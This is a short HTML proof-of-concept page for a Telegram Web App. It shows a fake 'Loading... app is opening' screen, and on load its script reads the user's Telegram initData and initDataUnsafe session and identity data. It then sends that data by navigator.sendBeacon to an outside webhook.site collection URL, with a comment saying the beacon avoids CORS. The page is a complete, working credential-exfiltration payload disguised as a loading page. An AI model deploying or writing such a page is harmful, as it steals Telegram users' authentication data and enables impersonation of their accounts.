<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC: Telegram WebApp initData</title>
</head>
<body>
  <h1>Loading.....</h1>
  <p>app is opening</p>

  <!-- Load Telegram WebApp SDK -->
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
  window.addEventListener("DOMContentLoaded", () => {
    const initData = Telegram.WebApp.initData;
    const initDataUnsafe = Telegram.WebApp.initDataUnsafe;

    console.log("ğŸ” Telegram initData:", initData);
    console.log("ğŸ”“ Parsed initDataUnsafe:", initDataUnsafe);

    // Send using beacon (avoids CORS problems)
    navigator.sendBeacon(
      "https://webhook.site/388648e4-9e1e-4912-b937-c8ac12c8aafd",
      new Blob([JSON.stringify({ initData, initDataUnsafe })], { type: "application/json" })
    );
  });
</script>


</body>
</html>
